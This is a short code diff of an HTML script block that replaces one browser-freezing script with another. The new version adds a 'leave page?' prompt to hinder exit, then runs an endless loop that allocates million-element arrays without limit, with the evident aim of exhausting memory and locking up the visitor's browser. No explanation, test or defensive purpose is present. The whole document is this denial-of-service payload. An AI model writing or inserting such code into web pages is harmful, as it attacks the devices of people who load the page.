@@ -1,15 +1,15 @@
-<script>let archive = [];
-function extremeLag() {
+<script>window.onbeforeunload = function() {
+  return "Are you sure you want to leave?";
+};
+
+let storage = [];
+function totalLockup() {
   while (true) {
-    archive.push(new Array(1000000).fill(Math.random()));
-    Promise.resolve().then(extremeLag);
-    
-    if (archive.length > 1000) {
-      archive.slice(0, 100); 
-    }
-    
-    console.log("Allocated: " + archive.length + " units");
+    storage.push(new Array(1000000).fill(Math.random()));
+    console.log("Memory utilized: " + storage.length);
   }
 }
-extremeLag();
+
+totalLockup();
+
 </script>
